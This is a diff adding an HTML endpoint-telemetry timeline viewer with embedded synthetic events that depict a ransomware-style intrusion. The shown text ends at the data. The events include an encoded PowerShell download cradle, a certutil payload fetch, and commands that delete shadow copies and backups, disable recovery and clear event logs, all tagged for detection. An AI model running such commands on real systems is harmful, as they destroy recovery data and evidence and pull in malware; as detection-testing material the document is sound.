@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SDL Timeline — synthetic_sdl.csv</title>
+<style>
+:root {
+  --bg:           #0a0e14;
+  --surface:      #11161d;
+  --surface-2:    #161c24;
+  --surface-hi:   #1d242e;
+  --border:       #2a323d;
+  --border-hi:    #3a4452;
+  --text:         #d8dee9;
+  --text-strong:  #eceff4;
+  --muted:        #6b7785;
+  --accent:       #ffaa44;          /* tactical amber */
+  --accent-soft:  rgba(255,170,68,0.12);
+  --link:         #88c0d0;
+
+  --sev-noise:    #4c5562;
+  --sev-low:      #6cbf6c;
+  --sev-medium:   #e0b341;
+  --sev-high:     #e75857;
+
+  --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display",
+               "Segoe UI", system-ui, "Helvetica Neue", sans-serif;
+  --font-mono: "JetBrains Mono", "Cascadia Mono", "Cascadia Code",
+               ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+}
+
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 13px;
+  line-height: 1.45;
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+
+/* ---------- Header ---------- */
+header {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 24px;
+  position: sticky; top: 0; z-index: 50;
+  display: flex; justify-content: space-between; align-items: center;
+}
+header .brand {
+  display: flex; align-items: baseline; gap: 12px;
+}
+header h1 {
+  margin: 0; font-size: 14px; font-weight: 600;
+  text-transform: uppercase; letter-spacing: 1.5px;
+  color: var(--text-strong);
+}
+header .brand .accent {
+  width: 6px; height: 14px; background: var(--accent); display: inline-block;
+}
+header .meta {
+  display: flex; gap: 18px; color: var(--muted); font-size: 11px;
+  font-family: var(--font-mono);
+}
+header .meta .source { color: var(--text); }
+
+/* ---------- Main layout ---------- */
+main { max-width: 1500px; margin: 0 auto; padding: 24px; }
+section { margin-bottom: 28px; }
+h2 {
+  font-size: 11px; font-weight: 700; color: var(--muted);
+  text-transform: uppercase; letter-spacing: 1.5px;
+  margin: 0 0 12px; padding-bottom: 6px;
+  border-bottom: 1px solid var(--border);
+  display: flex; justify-content: space-between; align-items: baseline;
+}
+h2 .count { color: var(--text); font-weight: 500; letter-spacing: 0; text-transform: none; font-size: 12px; }
+
+/* ---------- Summary cards ---------- */
+.summary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+  gap: 10px;
+}
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  padding: 14px 16px;
+}
+.card .label {
+  font-size: 10px; color: var(--muted);
+  text-transform: uppercase; letter-spacing: 1px;
+  margin-bottom: 8px;
+}
+.card .value {
+  font-family: var(--font-mono); font-size: 22px; font-weight: 500;
+  color: var(--text-strong);
+}
+.card .sub {
+  font-size: 11px; color: var(--muted); margin-top: 6px;
+  font-family: var(--font-mono); word-break: break-all;
+}
+.card.sev-high .value   { color: var(--sev-high); }
+.card.sev-medium .value { color: var(--sev-medium); }
+.card.sev-low .value    { color: var(--sev-low); }
+
+/* ---------- Filter bar ---------- */
+#filters {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  padding: 14px 16px;
+  display: flex; flex-wrap: wrap; gap: 18px; align-items: center;
+  position: sticky; top: 50px; z-index: 40;
+}
+.filter-group {
+  display: flex; gap: 8px; align-items: center;
+}
+.filter-group .label {
+  font-size: 10px; color: var(--muted);
+  text-transform: uppercase; letter-spacing: 1px;
+}
+.toggle {
+  padding: 4px 10px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  color: var(--text);
+  cursor: pointer;
+  font-size: 11px;
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  user-select: none;
+  transition: background 80ms, border-color 80ms, color 80ms;
+}
+.toggle:hover { border-color: var(--border-hi); }
+.toggle.active { background: var(--accent-soft); border-color: var(--accent); color: var(--accent); }
+.toggle.sev-noise.active   { background: rgba(76,85,98,0.18);  border-color: var(--sev-noise);  color: var(--sev-noise); }
+.toggle.sev-low.active     { background: rgba(108,191,108,0.12); border-color: var(--sev-low);    color: var(--sev-low); }
+.toggle.sev-medium.active  { background: rgba(224,179,65,0.12);  border-color: var(--sev-medium); color: var(--sev-medium); }
+.toggle.sev-high.active    { background: rgba(231,88,87,0.12);   border-color: var(--sev-high);   color: var(--sev-high); }
+
+input[type="search"] {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 6px 10px;
+  flex: 1; min-width: 220px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+}
+input[type="search"]:focus { outline: 1px solid var(--accent); border-color: var(--accent); }
+
+/* ---------- Process trees ---------- */
+.storyline {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  margin-bottom: 10px;
+}
+.storyline > summary {
+  list-style: none;
+  cursor: pointer;
+  padding: 10px 14px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text);
+  user-select: none;
+  display: flex; align-items: center; gap: 12px;
+  border-bottom: 1px solid transparent;
+}
+.storyline[open] > summary { border-bottom-color: var(--border); }
+.storyline > summary::-webkit-details-marker { display: none; }
+.storyline > summary::before {
+  content: "▸"; color: var(--muted); width: 10px; display: inline-block;
+  transition: transform 100ms;
+}
+.storyline[open] > summary::before { content: "▾"; }
+.storyline > summary .sid { color: var(--accent); }
+.storyline > summary .roll {
+  margin-left: auto; display: flex; gap: 6px;
+}
+.tree { padding: 12px 14px; }
+.tree-node {
+  padding: 4px 0 4px 14px;
+  border-left: 2px solid var(--border);
+  position: relative;
+  margin-left: 4px;
+}
+.tree-node.sev-high   { border-left-color: var(--sev-high); }
+.tree-node.sev-medium { border-left-color: var(--sev-medium); }
+.tree-node.sev-low    { border-left-color: var(--sev-low); }
+.tree-node.sev-noise  { border-left-color: var(--sev-noise); opacity: 0.65; }
+.tree-children { padding-left: 14px; }
+.tree-row {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+  font-family: var(--font-mono); font-size: 12px;
+  padding: 2px 0;
+}
+.tree-row .pname { color: var(--text-strong); font-weight: 500; }
+.tree-row .pid { color: var(--muted); }
+.tree-row .ec { color: var(--muted); font-size: 10px; }
+.tree-cmdline {
+  color: var(--muted);
+  font-family: var(--font-mono);
+  font-size: 11px;
+  padding-left: 0;
+  margin-top: 1px;
+  word-break: break-all;
+  white-space: pre-wrap;
+}
+
+/* ---------- Timeline ---------- */
+.event {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-left-width: 3px;
+  margin-bottom: 3px;
+  cursor: pointer;
+  transition: background 60ms;
+}
+.event:hover { background: var(--surface-2); }
+.event.sev-high   { border-left-color: var(--sev-high); }
+.event.sev-medium { border-left-color: var(--sev-medium); }
+.event.sev-low    { border-left-color: var(--sev-low); }
+.event.sev-noise  { border-left-color: var(--sev-noise); opacity: 0.55; }
+.event-line {
+  display: flex; align-items: center; gap: 10px;
+  padding: 6px 12px;
+  font-size: 12px;
+  flex-wrap: wrap;
+}
+.event-line .ts { font-family: var(--font-mono); font-size: 11px; color: var(--muted); min-width: 165px; }
+.event-line .ep { color: var(--link); font-family: var(--font-mono); font-size: 11px; }
+.event-line .pname { font-family: var(--font-mono); color: var(--text-strong); }
+.event-line .pname .pid { color: var(--muted); font-weight: normal; }
+.event-line .et { color: var(--muted); font-size: 11px; }
+.event-detail {
+  display: none;
+  padding: 8px 12px 12px 12px;
+  border-top: 1px solid var(--border);
+  background: var(--bg);
+}
+.event.expanded .event-detail { display: block; }
+.detail-grid {
+  display: grid;
+  grid-template-columns: 110px 1fr;
+  gap: 4px 12px;
+  font-family: var(--font-mono); font-size: 11px;
+}
+.detail-grid .k {
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  font-size: 10px;
+  padding-top: 2px;
+}
+.detail-grid .v { color: var(--text); word-break: break-all; white-space: pre-wrap; }
+
+/* ---------- Badges & pills ---------- */
+.pill {
+  display: inline-block;
+  padding: 1px 6px;
+  font-size: 10px;
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border: 1px solid currentColor;
+  background: transparent;
+}
+.pill.sev-noise  { color: var(--sev-noise); }
+.pill.sev-low    { color: var(--sev-low); }
+.pill.sev-medium { color: var(--sev-medium); }
+.pill.sev-high   { color: var(--sev-high); }
+.pill.cat {
+  color: var(--link);
+  border-color: rgba(136,192,208,0.4);
+}
+.flag {
+  display: inline-block;
+  padding: 1px 5px;
+  font-size: 9px;
+  font-family: var(--font-mono);
+  background: rgba(231,88,87,0.08);
+  color: var(--sev-high);
+  border: 1px solid rgba(231,88,87,0.3);
+  text-transform: lowercase;
+  letter-spacing: 0.3px;
+}
+
+/* ---------- Empty state ---------- */
+.empty {
+  padding: 40px;
+  text-align: center;
+  color: var(--muted);
+  font-style: italic;
+  border: 1px dashed var(--border);
+}
+
+/* ---------- Footer ---------- */
+footer {
+  border-top: 1px solid var(--border);
+  padding: 16px 24px;
+  color: var(--muted);
+  font-size: 11px;
+  font-family: var(--font-mono);
+  text-align: center;
+}
+
+/* ---------- Scrollbar ---------- */
+::-webkit-scrollbar { width: 10px; height: 10px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); }
+::-webkit-scrollbar-thumb:hover { background: var(--border-hi); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand"><span class="accent"></span><h1>SDL Timeline</h1></div>
+  <div class="meta">
+    <span class="source">synthetic_sdl.csv</span>
+    <span>generated 2026-05-09 00:52:23</span>
+  </div>
+</header>
+
+<main>
+
+  <section>
+    <h2>Summary</h2>
+    <div id="summary-grid" class="summary-grid"></div>
+  </section>
+
+  <section id="filters">
+    <div class="filter-group"><span class="label">Severity</span><div id="filter-sev" style="display:flex;gap:6px"></div></div>
+    <div class="filter-group"><span class="label">Category</span><div id="filter-cat" style="display:flex;gap:6px;flex-wrap:wrap"></div></div>
+    <div class="filter-group" style="flex:1;min-width:240px"><span class="label">Search</span>
+      <input type="search" id="filter-search" placeholder="process, hash, ip, domain, flag..." />
+    </div>
+  </section>
+
+  <section>
+    <h2>Process Trees by Storyline <span class="count">click any storyline to expand</span></h2>
+    <div id="tree-container"></div>
+  </section>
+
+  <section>
+    <h2>Event Timeline <span class="count" id="timeline-count">—</span></h2>
+    <div id="timeline-list"></div>
+  </section>
+
+</main>
+
+<footer>
+  sdl-timeline · self-contained report · all filtering runs locally in your browser · no data left this machine
+</footer>
+
+<script>
+const EVENTS     = [{"ts":"2026-04-15T14:02:11.123000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"low","flags":[],"proc_name":"explorer.exe","proc_pid":"4288","proc_user":"GARLAND\\jdoe","parent_name":"userinit.exe","parent_pid":"1024","storyline":"storyline-aaa-001","detail":{"cmdline":"C:\\Windows\\Explorer.EXE","path":"C:\\Windows\\explorer.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"e6a5d6a25ee9aaaaaaaa11111111aaaaaaaa"}},{"ts":"2026-04-15T14:05:43.001000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"low","flags":[],"proc_name":"OUTLOOK.EXE","proc_pid":"4512","proc_user":"GARLAND\\jdoe","parent_name":"explorer.exe","parent_pid":"4288","storyline":"storyline-aaa-001","detail":{"cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","publisher":"Microsoft Corporation","verified":"signed","sha256":"bbbb1111aaaa2222bbbb3333cccc4444"}},{"ts":"2026-04-15T14:12:09.882000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"low","flags":[],"proc_name":"WINWORD.EXE","proc_pid":"5104","proc_user":"GARLAND\\jdoe","parent_name":"OUTLOOK.EXE","parent_pid":"4512","storyline":"storyline-aaa-001","detail":{"cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_Q2.docm\"","path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","publisher":"Microsoft Corporation","verified":"signed","sha256":"cccc2222bbbb3333dddd4444eeee5555"}},{"ts":"2026-04-15T14:12:14.221000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["ps:encoded-command","ps:hidden-window","ps:no-profile"],"proc_name":"cmd.exe","proc_pid":"6204","proc_user":"GARLAND\\jdoe","parent_name":"WINWORD.EXE","parent_pid":"5104","storyline":"storyline-aaa-001","detail":{"cmdline":"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==","path":"C:\\Windows\\System32\\cmd.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"dddd3333cccc4444eeee5555ffff6666"}},{"ts":"2026-04-15T14:12:14.498000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["lolbin","ps:encoded-command","ps:hidden-window","ps:no-profile"],"proc_name":"powershell.exe","proc_pid":"6388","proc_user":"GARLAND\\jdoe","parent_name":"cmd.exe","parent_pid":"6204","storyline":"storyline-aaa-001","detail":{"cmdline":"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==","path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"eeee4444dddd5555ffff6666aaaa7777","parent_cmdline":"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA=="}},{"ts":"2026-04-15T14:12:15.102000+00:00","event_type":"DNS Resolved","category":"dns","endpoint":"WS-MARKETING-04","severity":"medium","flags":["lolbin","ps:hidden-window","ps:no-profile"],"proc_name":"powershell.exe","proc_pid":"6388","proc_user":"GARLAND\\jdoe","parent_name":"cmd.exe","parent_pid":"6204","storyline":"storyline-aaa-001","detail":{"request":"185.220.101.45","cmdline":"powershell.exe -nop -w hidden -enc SQBu..."}},{"ts":"2026-04-15T14:12:15.488000+00:00","event_type":"IP Connect","category":"network","endpoint":"WS-MARKETING-04","severity":"medium","flags":["lolbin","ps:hidden-window","ps:no-profile"],"proc_name":"powershell.exe","proc_pid":"6388","proc_user":"GARLAND\\jdoe","parent_name":"cmd.exe","parent_pid":"6204","storyline":"storyline-aaa-001","detail":{"src":"10.10.20.55:49981","dst":"185.220.101.45:443","protocol":"TCP","cmdline":"powershell.exe -nop -w hidden -enc SQBu..."}},{"ts":"2026-04-15T14:12:16.001000+00:00","event_type":"File Creation","category":"file","endpoint":"WS-MARKETING-04","severity":"high","flags":["lolbin","path:write-suspicious","ps:hidden-window","ps:no-profile"],"proc_name":"powershell.exe","proc_pid":"6388","proc_user":"GARLAND\\jdoe","parent_name":"cmd.exe","parent_pid":"6204","storyline":"storyline-aaa-001","detail":{"path":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe","sha256":"ffff5555eeee6666dddd7777cccc8888","cmdline":"powershell.exe -nop -w hidden -enc SQBu..."}},{"ts":"2026-04-15T14:12:21.336000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"low","flags":["path:proc-suspicious"],"proc_name":"svchost.exe","proc_pid":"7012","proc_user":"GARLAND\\jdoe","parent_name":"powershell.exe","parent_pid":"6388","storyline":"storyline-aaa-001","detail":{"cmdline":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe","path":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe","verified":"unsigned","sha256":"ffff5555eeee6666dddd7777cccc8888","parent_cmdline":"powershell.exe -nop -w hidden -enc SQBu..."}},{"ts":"2026-04-15T14:12:25.119000+00:00","event_type":"Registry Value Modified","category":"registry","endpoint":"WS-MARKETING-04","severity":"low","flags":["path:proc-suspicious"],"proc_name":"svchost.exe","proc_pid":"7012","proc_user":"GARLAND\\jdoe","parent_name":"powershell.exe","parent_pid":"6388","storyline":"storyline-aaa-001","detail":{"key":"WindowsUpdate","cmdline":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe"}},{"ts":"2026-04-15T14:12:30.402000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["ransom:shadow-delete"],"proc_name":"vssadmin.exe","proc_pid":"7240","proc_user":"NT AUTHORITY\\SYSTEM","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"cmdline":"vssadmin.exe delete shadows /all /quiet","path":"C:\\Windows\\System32\\vssadmin.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"1111aaaa2222bbbb3333cccc4444dddd","parent_cmdline":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe"}},{"ts":"2026-04-15T14:12:31.999000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["ransom:recovery-disable"],"proc_name":"bcdedit.exe","proc_pid":"7256","proc_user":"NT AUTHORITY\\SYSTEM","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"cmdline":"bcdedit.exe /set {default} recoveryenabled no","path":"C:\\Windows\\System32\\bcdedit.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"2222bbbb3333cccc4444dddd5555eeee"}},{"ts":"2026-04-15T14:12:33.117000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["ransom:backup-delete"],"proc_name":"wbadmin.exe","proc_pid":"7288","proc_user":"NT AUTHORITY\\SYSTEM","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"cmdline":"wbadmin.exe delete catalog -quiet","path":"C:\\Windows\\System32\\wbadmin.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"3333cccc4444dddd5555eeee6666ffff"}},{"ts":"2026-04-15T14:12:40.009000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["evasion:eventlog-clear"],"proc_name":"wevtutil.exe","proc_pid":"7301","proc_user":"NT AUTHORITY\\SYSTEM","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"cmdline":"wevtutil.exe cl Security","path":"C:\\Windows\\System32\\wevtutil.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"4444dddd5555eeee6666ffff7777aaaa"}},{"ts":"2026-04-15T14:13:01.555000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-MARKETING-04","severity":"high","flags":["lolbin","lolbin:rundll32-userpath-dll"],"proc_name":"rundll32.exe","proc_pid":"7444","proc_user":"GARLAND\\jdoe","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"cmdline":"rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\m.dll,Start","path":"C:\\Windows\\System32\\rundll32.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"5555eeee6666ffff7777aaaa8888bbbb"}},{"ts":"2026-04-15T14:13:02.017000+00:00","event_type":"Module Load","category":"module","endpoint":"WS-MARKETING-04","severity":"high","flags":["lolbin","lolbin:rundll32-userpath-dll"],"proc_name":"rundll32.exe","proc_pid":"7444","proc_user":"GARLAND\\jdoe","parent_name":"svchost.exe","parent_pid":"7012","storyline":"storyline-aaa-001","detail":{"module":"9999aaaa1111bbbb2222cccc3333dddd","cmdline":"rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\m.dll,Start"}},{"ts":"2026-04-15T14:14:11.823000+00:00","event_type":"IP Connect","category":"network","endpoint":"WS-DESIGN-02","severity":"low","flags":[],"proc_name":"chrome.exe","proc_pid":"2218","proc_user":"GARLAND\\msmith","parent_name":"explorer.exe","parent_pid":"1024","storyline":"storyline-bbb-002","detail":{"src":"10.10.20.78:52341","dst":"142.250.80.46:443","protocol":"TCP","cmdline":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""}},{"ts":"2026-04-15T14:14:12.998000+00:00","event_type":"DNS Resolved","category":"dns","endpoint":"WS-DESIGN-02","severity":"low","flags":[],"proc_name":"chrome.exe","proc_pid":"2218","proc_user":"GARLAND\\msmith","parent_name":"explorer.exe","parent_pid":"1024","storyline":"storyline-bbb-002","detail":{"request":"www.google.com","response":"142.250.80.46","cmdline":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""}},{"ts":"2026-04-15T14:16:42.013000+00:00","event_type":"Process Creation","category":"process","endpoint":"WS-FINANCE-01","severity":"high","flags":["lolbin","lolbin:certutil"],"proc_name":"certutil.exe","proc_pid":"9112","proc_user":"GARLAND\\acook","parent_name":"cmd.exe","parent_pid":"8888","storyline":"storyline-ccc-003","detail":{"cmdline":"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\\Users\\Public\\p.txt","path":"C:\\Windows\\System32\\certutil.exe","publisher":"Microsoft Windows","verified":"signed","sha256":"3333eeee4444ffff5555aaaa6666bbbb","parent_cmdline":"cmd.exe"}},{"ts":"2026-04-15T14:17:01.118000+00:00","event_type":"File Creation","category":"file","endpoint":"WS-FINANCE-01","severity":"high","flags":["lolbin","path:write-suspicious","lolbin:certutil"],"proc_name":"certutil.exe","proc_pid":"9112","proc_user":"GARLAND\\acook","parent_name":"cmd.exe","parent_pid":"8888","storyline":"storyline-ccc-003","detail":{"path":"C:\\Users\\Public\\p.txt","sha256":"4444aaaa5555bbbb6666cccc7777dddd","cmdline":"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\\Users\\Public\\p.txt"}}];
+const STORYLINES = {"storyline-aaa-001":[{"name":"userinit.exe","pid":"1024","uid":"uid-userinit","cmdline":"","path":"","publisher":"","verified":"","user":"","event_count":0,"flags":[],"severity":"high","self_severity":"low","first_seen":null,"last_seen":null,"children":[{"name":"explorer.exe","pid":"4288","uid":"uid-explorer","cmdline":"C:\\Windows\\Explorer.EXE","path":"C:\\Windows\\explorer.exe","publisher":"Microsoft Windows","verified":"signed","user":"GARLAND\\jdoe","event_count":1,"flags":[],"severity":"high","self_severity":"low","first_seen":"2026-04-15T14:02:11.123000+00:00","last_seen":"2026-04-15T14:02:11.123000+00:00","children":[{"name":"OUTLOOK.EXE","pid":"4512","uid":"uid-outlook","cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","publisher":"Microsoft Corporation","verified":"signed","user":"GARLAND\\jdoe","event_count":1,"flags":[],"severity":"high","self_severity":"low","first_seen":"2026-04-15T14:05:43.001000+00:00","last_seen":"2026-04-15T14:05:43.001000+00:00","children":[{"name":"WINWORD.EXE","pid":"5104","uid":"uid-winword","cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_Q2.docm\"","path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","publisher":"Microsoft Corporation","verified":"signed","user":"GARLAND\\jdoe","event_count":1,"flags":[],"severity":"high","self_severity":"low","first_seen":"2026-04-15T14:12:09.882000+00:00","last_seen":"2026-04-15T14:12:09.882000+00:00","children":[{"name":"cmd.exe","pid":"6204","uid":"uid-cmd-1","cmdline":"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==","path":"C:\\Windows\\System32\\cmd.exe","publisher":"Microsoft Windows","verified":"signed","user":"GARLAND\\jdoe","event_count":1,"flags":["ps:encoded-command","ps:hidden-window","ps:no-profile"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:14.221000+00:00","last_seen":"2026-04-15T14:12:14.221000+00:00","children":[{"name":"powershell.exe","pid":"6388","uid":"uid-ps-1","cmdline":"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==","path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","publisher":"Microsoft Windows","verified":"signed","user":"GARLAND\\jdoe","event_count":4,"flags":["lolbin","path:write-suspicious","ps:encoded-command","ps:hidden-window","ps:no-profile"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:14.498000+00:00","last_seen":"2026-04-15T14:12:16.001000+00:00","children":[{"name":"svchost.exe","pid":"7012","uid":"uid-stage2","cmdline":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe","path":"C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe","publisher":"","verified":"unsigned","user":"GARLAND\\jdoe","event_count":2,"flags":["path:proc-suspicious"],"severity":"high","self_severity":"low","first_seen":"2026-04-15T14:12:21.336000+00:00","last_seen":"2026-04-15T14:12:25.119000+00:00","children":[{"name":"vssadmin.exe","pid":"7240","uid":"uid-vss","cmdline":"vssadmin.exe delete shadows /all /quiet","path":"C:\\Windows\\System32\\vssadmin.exe","publisher":"Microsoft Windows","verified":"signed","user":"NT AUTHORITY\\SYSTEM","event_count":1,"flags":["ransom:shadow-delete"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:30.402000+00:00","last_seen":"2026-04-15T14:12:30.402000+00:00","children":[]},{"name":"bcdedit.exe","pid":"7256","uid":"uid-bcd","cmdline":"bcdedit.exe /set {default} recoveryenabled no","path":"C:\\Windows\\System32\\bcdedit.exe","publisher":"Microsoft Windows","verified":"signed","user":"NT AUTHORITY\\SYSTEM","event_count":1,"flags":["ransom:recovery-disable"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:31.999000+00:00","last_seen":"2026-04-15T14:12:31.999000+00:00","children":[]},{"name":"wbadmin.exe","pid":"7288","uid":"uid-wbadmin","cmdline":"wbadmin.exe delete catalog -quiet","path":"C:\\Windows\\System32\\wbadmin.exe","publisher":"Microsoft Windows","verified":"signed","user":"NT AUTHORITY\\SYSTEM","event_count":1,"flags":["ransom:backup-delete"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:33.117000+00:00","last_seen":"2026-04-15T14:12:33.117000+00:00","children":[]},{"name":"wevtutil.exe","pid":"7301","uid":"uid-wevtutil","cmdline":"wevtutil.exe cl Security","path":"C:\\Windows\\System32\\wevtutil.exe","publisher":"Microsoft Windows","verified":"signed","user":"NT AUTHORITY\\SYSTEM","event_count":1,"flags":["evasion:eventlog-clear"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:12:40.009000+00:00","last_seen":"2026-04-15T14:12:40.009000+00:00","children":[]},{"name":"rundll32.exe","pid":"7444","uid":"uid-rundll-credui","cmdline":"rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\m.dll,Start","path":"C:\\Windows\\System32\\rundll32.exe","publisher":"Microsoft Windows","verified":"signed","user":"GARLAND\\jdoe","event_count":2,"flags":["lolbin","lolbin:rundll32-userpath-dll"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:13:01.555000+00:00","last_seen":"2026-04-15T14:13:02.017000+00:00","children":[]}]}]}]}]}]}]}]}],"storyline-bbb-002":[{"name":"explorer.exe","pid":"1024","uid":"uid-explorer-2","cmdline":"","path":"","publisher":"","verified":"","user":"","event_count":0,"flags":[],"severity":"low","self_severity":"low","first_seen":null,"last_seen":null,"children":[{"name":"chrome.exe","pid":"2218","uid":"uid-chrome","cmdline":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"","path":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","publisher":"Google LLC","verified":"signed","user":"GARLAND\\msmith","event_count":2,"flags":[],"severity":"low","self_severity":"low","first_seen":"2026-04-15T14:14:11.823000+00:00","last_seen":"2026-04-15T14:14:12.998000+00:00","children":[]}]}],"storyline-ccc-003":[{"name":"cmd.exe","pid":"8888","uid":"uid-cmd-fin","cmdline":"cmd.exe","path":"","publisher":"","verified":"","user":"","event_count":0,"flags":[],"severity":"high","self_severity":"low","first_seen":null,"last_seen":null,"children":[{"name":"certutil.exe","pid":"9112","uid":"uid-certutil","cmdline":"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\\Users\\Public\\p.txt","path":"C:\\Windows\\System32\\certutil.exe","publisher":"Microsoft Windows","verified":"signed","user":"GARLAND\\acook","event_count":2,"flags":["lolbin","lolbin:certutil","path:write-suspicious"],"severity":"high","self_severity":"high","first_seen":"2026-04-15T14:16:42.013000+00:00","last_seen":"2026-04-15T14:17:01.118000+00:00","children":[]}]}]};
